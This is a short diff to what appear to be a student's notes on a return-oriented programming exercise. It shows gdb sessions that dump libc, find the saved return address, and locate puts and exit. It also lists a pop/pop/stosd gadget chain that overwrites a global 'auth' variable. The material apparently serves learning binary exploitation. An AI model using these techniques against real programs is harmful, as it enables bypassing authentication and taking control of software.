@@ -18,3 +18,26 @@ $1 = {void (int)} 0xb7b41990 <__GI_exit>
 q2 self documentation - building a ROP gadget search engine:
 ---------------------
 (gdb) dump binary memory libc.bin 0xb7b270f0 0xb7c7aa96
+q3 self documentation - using the engine for changing global variable auth
+---------------------
+origin return address to continue the flow after the return address
+(gdb) p/x $esp
+$2 = 0xbfffe08c
+(gdb) p/x 0xbfffe08c
+$3 = 0xbfffe08c
+(gdb) p/x *0xbfffe08c
+$4 = 0x80488b0
+(gdb) si
+0x080488b0 in main ()
+
+mov dword ptr [ebx], {0} not found yet found:
+
+pop eax # save patched auth into eax
+pop edi # save auth address into edi
+stosd # write eax into edi and increment edi aka mov to auth variable to patched auth
+q4 self documentation - using the engine to create endless print message loop
+---------------------
+(gdb) print &puts
+$6 = (int (*)(const char *)) 0xb7b7a460 <__GI__IO_puts>
+
+
